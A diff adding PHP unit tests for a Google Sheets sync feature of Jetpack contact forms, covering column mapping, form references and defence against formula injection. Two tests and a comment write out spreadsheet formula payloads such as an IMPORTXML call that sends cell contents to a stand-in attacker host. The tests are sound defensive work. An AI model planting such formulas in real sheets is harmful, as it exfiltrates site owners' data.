@@ -143,6 +143,40 @@ class Google_Sheets_Setup_Test extends BaseTestCase {
 	}
 
 	/**
+	 * Sheets evaluates a cell beginning with =, +, - or @, so a submitter could
+	 * otherwise run a formula inside the site owner's Drive - exfiltrating the
+	 * sheet's contents with something like
+	 * =IMPORTXML("https://evil.tld/?x="&CONCATENATE(A1:Z1)).
+	 *
+	 * The one-shot export guards the same Google_Drive::create_sheet() call with
+	 * esc_csv(); the sync path has to do the same.
+	 */
+	public function test_row_neutralizes_formula_triggers_in_values() {
+		$form = $this->get_form_for( 0 );
+		$id   = $this->save_response_for_form( $form, '=IMPORTXML("https://evil.tld/?x="&A1)' );
+
+		$row = Google_Sheets_Setup::build_row( Feedback::get( $id ), self::FORM_LABELS );
+
+		// Assert the leading apostrophe rather than the whole string: the value
+		// also picks up entity encoding on its way through the response pipeline,
+		// which is pre-existing behaviour and not what this test is about.
+		$this->assertStringStartsWith( '\'=IMPORTXML(', $row[2] );
+	}
+
+	/**
+	 * A label is submitter-influenced on some forms and reaches the sheet as a
+	 * header cell, so it needs the same treatment.
+	 */
+	public function test_header_row_neutralizes_formula_triggers_in_labels() {
+		$header = Google_Sheets_Setup::build_header_row( array( '=HYPERLINK("https://evil.tld")', '+1', 'Name' ) );
+
+		$this->assertSame(
+			array( 'Submitted', 'Source', '\'=HYPERLINK("https://evil.tld")', '\'+1', 'Name' ),
+			$header
+		);
+	}
+
+	/**
 	 * Reordering the frozen columns reorders the row, so rows written before and
 	 * after a form edit still land under the right headers.
 	 */
@@ -276,6 +310,73 @@ class Google_Sheets_Setup_Test extends BaseTestCase {
 	}
 
 	/**
+	 * Clearing the label text writes an empty `label` attribute. The runtime
+	 * takes it with `??`, so the empty string wins and the response is keyed
+	 * under "Field". Treating it as absent here would head the column with the
+	 * type default instead and leave it blank forever.
+	 */
+	public function test_form_columns_treat_an_empty_label_the_way_the_runtime_does() {
+		$content = '<!-- wp:jetpack/field-text -->' .
+			'<!-- wp:jetpack/label {"label":""} /-->' .
+			'<!-- wp:jetpack/input /-->' .
+			'<!-- /wp:jetpack/field-text -->';
+
+		$this->assertSame(
+			array( 'Field' ),
+			Google_Sheets_Setup::get_columns_from_content( $content )
+		);
+	}
+
+	/**
+	 * The label block's `defaultLabel` is the runtime's second choice, ahead of
+	 * the type default.
+	 */
+	public function test_form_columns_honor_the_label_blocks_default_label() {
+		$content = '<!-- wp:jetpack/field-text -->' .
+			'<!-- wp:jetpack/label {"defaultLabel":"Your message"} /-->' .
+			'<!-- wp:jetpack/input /-->' .
+			'<!-- /wp:jetpack/field-text -->';
+
+		$this->assertSame(
+			array( 'Your message' ),
+			Google_Sheets_Setup::get_columns_from_content( $content )
+		);
+	}
+
+	/**
+	 * Labels are RichText, so an ampersand is stored encoded. Feedback_Field
+	 * decodes on the way in, so an undecoded column would never match.
+	 */
+	public function test_form_columns_decode_entities_in_labels() {
+		$content = '<!-- wp:jetpack/field-text -->' .
+			'<!-- wp:jetpack/label {"label":"Q&amp;A"} /-->' .
+			'<!-- wp:jetpack/input /-->' .
+			'<!-- /wp:jetpack/field-text -->';
+
+		$this->assertSame(
+			array( 'Q&A' ),
+			Google_Sheets_Setup::get_columns_from_content( $content )
+		);
+	}
+
+	/**
+	 * A choice field's block name is not its type: single-choice renders as
+	 * radio, which is what get_default_label_from_type() has a case for.
+	 */
+	public function test_form_columns_map_choice_block_names_to_field_types() {
+		$content = '<!-- wp:jetpack/field-single-choice /-->' .
+			'<!-- wp:jetpack/field-multiple-choice /-->';
+
+		$this->assertSame(
+			array(
+				Contact_Form::get_default_label_from_type( 'radio' ),
+				Contact_Form::get_default_label_from_type( 'checkbox-multiple' ),
+			),
+			Google_Sheets_Setup::get_columns_from_content( $content )
+		);
+	}
+
+	/**
 	 * Option sub-blocks carry their own `label` attribute holding the option
 	 * text. Recursing into a field block turns each option into a column.
 	 */
@@ -345,6 +446,40 @@ class Google_Sheets_Setup_Test extends BaseTestCase {
 		);
 
 		$this->assertSame( array( 'Name' ), Google_Sheets_Setup::get_columns_from_content( $content ) );
+	}
+
+	/**
+	 * The default shape with central form management on: the page holds only a
+	 * reference and the fields live in the jetpack_form post. Parsing the page
+	 * alone finds nothing, which would leave the feature inert on exactly the
+	 * forms most people have.
+	 */
+	public function test_form_reference_is_found_in_page_markup() {
+		$this->assertSame(
+			42,
+			Google_Sheets_Setup::get_form_ref_from_content( '<!-- wp:jetpack/contact-form {"ref":42} /-->' )
+		);
+	}
+
+	/**
+	 * The reference is often nested inside layout blocks rather than sitting at
+	 * the top level of the page.
+	 */
+	public function test_form_reference_is_found_when_nested() {
+		$content = '<!-- wp:group --><!-- wp:columns --><!-- wp:column -->' .
+			'<!-- wp:jetpack/contact-form {"ref":7} /-->' .
+			'<!-- /wp:column --><!-- /wp:columns --><!-- /wp:group -->';
+
+		$this->assertSame( 7, Google_Sheets_Setup::get_form_ref_from_content( $content ) );
+	}
+
+	/**
+	 * An inline form carries its fields directly and has no reference to follow.
+	 */
+	public function test_no_form_reference_for_an_inline_form() {
+		$content = '<!-- wp:jetpack/contact-form -->' . $this->field_block( 'name', 'Name' ) . '<!-- /wp:jetpack/contact-form -->';
+
+		$this->assertNull( Google_Sheets_Setup::get_form_ref_from_content( $content ) );
 	}
 
 	public function test_form_columns_are_empty_for_a_missing_post() {
